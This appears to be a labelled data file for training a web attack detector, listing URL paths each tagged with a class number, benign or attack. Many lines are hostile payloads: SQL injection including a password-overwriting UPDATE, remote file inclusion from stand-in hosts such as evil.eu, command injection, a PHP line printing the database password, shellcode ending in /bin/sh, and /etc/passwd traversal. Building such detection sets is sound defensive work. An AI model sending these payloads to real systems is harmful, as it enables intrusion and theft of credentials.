/api/v1/login/?username=admin&password=1234,0
/index.php/?id=0 or 1=1,1
/orders.php/?username=admin&password=1239,0
/api/v1/orders/?,0
/?,0
/index.php/?post==<?php print $settings[database][password]; ?>,8
/blog/our-proposals/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/index.php/?username=admin&password=password,0
/orders.php/?username=admin&password=1237,0
/api/v1/register/?username=admin&password=1237,0
/api/v1/customers/?id=0 or 1=1,1
/blog/our-proposals/?,0
/api/v1/register/.env/README.txt?,0
/?page=1&customerId=AND%id%IS%NULL;,1
/core/files/js/upload.js/?,0
/core/files/js/editor.js/?file=http://evil.eu/sh,2
/api/v1/login/?,0
/login.php/?ip=| ls -l,8
/core/files/js/editor.js/?post=%3script>alert(1);,2
/cgi-bin/count.cgi/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/index.php/?username=admin&password=1235,0
/?post==<?php print $settings[database][password]; ?>,8
/?username=admin&password=admin,0
/?post=%3script>alert(1);,2
/page/about-us/?,0
/?username=admin&password=1237,0
/register.php/?username=admin&password=admin2,0
/api/v1/login/?username=admin&password=1238,0
/orders.php/?ip=| ls -l,8
/index.php/?file=http://evil.eu/sh,2
/index.php/?userid=bob'; update logintable set passwd='0wn3d';--/login.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/a?[buffer]=89898,0
/update.php/?post==<?php print $settings[database][password]; ?>,8
/?username=admin&password=password,0
/orders.php/?username=admin&password=admin,0
/authorize.php/?,0
/core/files/js/editor.js/?username=admin&password=1234,0
/?id=0 or 1=1,1
/connection.php/?username=admin&password=password,0
/api/v1/customers/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/api/v1/orders/?file=http://evil.eu/sh,2
/api/v1/register/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/index.php/?,0
/page/about-us/?post==<?php print $settings[database][password]; ?>,8
/register.php/?post=%3script>alert(1);,2
/?username=admin&password=1239,0
/login.php/?,0
/cgi-bin/count.cgi/?,0
/core/files/js/editor.js/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/login.php/?file=http://evil.eu/sh,2
/api/v1/customers/?userid=bob'; update logintable set passwd='0wn3d';--/page/about-us/?username=admin&password=1237,0
/orders.php/?userid=bob'; update logintable set passwd='0wn3d';--/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/index.php/?username=admin&password=1239,0
/register.php/?post==<?php print $settings[database][password]; ?>,8
/index.php/?username=admin&password=1238,0
/login.php/?username=admin&password=1239,0
/core/themes/theme.inc/?post==<?php print $settings[database][password]; ?>,8
/core/files/js/upload.js/?post==<?php print $settings[database][password]; ?>,8
/page/about-us/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/login.php/?userid=bob'; update logintable set passwd='0wn3d';--/api/v1/register/?,0
/core/themes/theme.inc/?file=http://evil.eu/sh,2
/?ip=| ls -l,8
/login.php/?page=1&customerId=AND%id%IS%NULL;,1
/xmlrpc.php/?customerId=1OR 1=1,1
/?customerId=1OR 1=1,1
/api/v1/login/?username=admin&password=1237,0
/api/v1/login/?file=http://evil.eu/sh,2
/connection.php/?post=%3script>alert(1);,2
/index.php/\xf9\xa9\xa5\xcc\xa87\x17b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8,8
/core/themes/theme.inc/?,0
/index.php/?page=1&customerId=AND%id%IS%NULL;,1
/register.php/?,0
/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/api/v1/register/?post=%3script>alert(1);,2
/core/files/js/editor.js/?,0
/update.php/?,0
/index.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/login.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/api/v1/register/?username=admin&password=1234,0
/api/v1/customers/.well-known/assetlinks.json?,0
/core/files/js/upload.js/?file=http://evil.eu/sh,2
/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/api/v1/customers/?session=vwdefcwec334scfdjr49ccededfewsd,0
/update.php/?username=admin&password=1238,0
/core/files/js/upload.js/?username=admin&password=1238,0
/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/connection.php/?,0
/cgi-bin/count.cgi/?file=http://evil.eu/sh,2
/core/files/js/editor.js/?username=admin&password=1235,0
/orders.php/?post=%3script>alert(1);,2
/login.php/?username=admin&password=1235,0
/?username=admin&password=admin2,0
/core/files/js/upload.js/?username=admin&password=admin2,0
/orders.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/xmlrpc.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/?file=http://evil.eu/sh,2
/update.php/?file=http://evil.eu/sh,2
/api/v1/register/?id=0 or 1=1,1
/core/files/js/editor.js/?ip=| ls -l,8
/api/v1/login/?post=%3script>alert(1);,2
/login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/index.php/?post=%3script>alert(1);,2
/authorize.php/?username=admin&password=1234,0
/core/files/js/editor.js/?username=admin&password=password,0
/authorize.php/?post=%3script>alert(1);,2
/?username=admin&password=1238,0
/orders.php/?,0
/index.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,2
/api/v1/customers/?,0
/api/v1/login/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/login.php/?id=0 or 1=1,1
/login.php/?username=admin&password=1234,0
/register.php/?username=admin&password=1238,0
/?username=admin&password=1234,0
/orders.php/.env/README.txt?,0
/login.php/?username=admin&password=1236,0
/cgi-bin/count.cgi/?id=0 or 1=1,1
/connection.php/?ip=| ls -l,8
/blog/our-proposals/a?[buffer]=89898,0
/index.php/?username=admin&password=admin,0
/connection.php/?username=admin&password=1237,0
/blog/better-products-for-2019/?file=http://evil.eu/root.asp,2
/api/v1/customers/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/login.php/?username=admin&password=password,0
/api/v1/login/?post==<?php print $settings[database][password]; ?>,8
/orders.php/?username=admin&password=1234,0
/api/v1/register/?username=admin&password=1239,0
/connection.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb 3\x88\xd2%z?,8
/blog/how-to-shop/?,0
/page/about-us/?page=1&customerId=AND%id%IS%NULL;,1
/login.php/?post==<?php print $settings[database][password]; ?>,8
/index.php/?username=admin&password=1237,0
/api/v1/register/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/update.php/?username=admin&password=password,0
/orders.php/?username=admin&password=1235,0
/orders.php/?file=http://evil.eu/sh,2
/core/files/js/upload.js/a?[buffer]=89898,0
/register.php/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/register.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/api/v1/login/a?[buffer]=89898,0
/index.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/register.php/?username=admin&password=1237,0
/login.php/?page=http://192.168.80.128/rfi.php,2
/api/v1/login/?id=0 or 1=1,1
/api/v1/register/a?[buffer]=89898,0
/core/themes/theme.inc/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/index.php/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git,8
/core/themes/theme.inc/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/api/v1/register/?username=admin&password=1236,0
/login.php/.well-known/assetlinks.json?,0
/api/v1/register/?username=admin&password=password,0
/core/files/js/editor.js/?username=admin&password=1239,0
/.well-known/assetlinks.json?,0
/index.php/a?[buffer]=89898,0
/api/v1/register/?page=/../../../../../../etc/passwd,4
/login.php/?user=admin&amount=100000,0
/login.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/api/v1/login/?username=admin&password=admin,0
/connection.php/?file=http://evil.eu/sh,2
/core/files/js/upload.js/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,2
/api/v1/register/?file=http://evil.eu/sh,2
/core/files/js/editor.js/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,2
/core/files/js/upload.js/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh,8
/register.php/?user=admin&amount=100000,0
/login.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/login.php/?post=%3script>alert(1);,2
/update.php/?userid=bob'; update logintable set passwd='0wn3d';--/orders.php/a?[buffer]=89898,0
/index.php/?username=admin&password=1234,0
/index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/register.php/.env/README.txt?,0
/register.php/?file=http://evil.eu/root.asp,2
/core/files/js/upload.js/?customerId=1OR 1=1,1
/api/v1/login/.well-known/assetlinks.json?,0
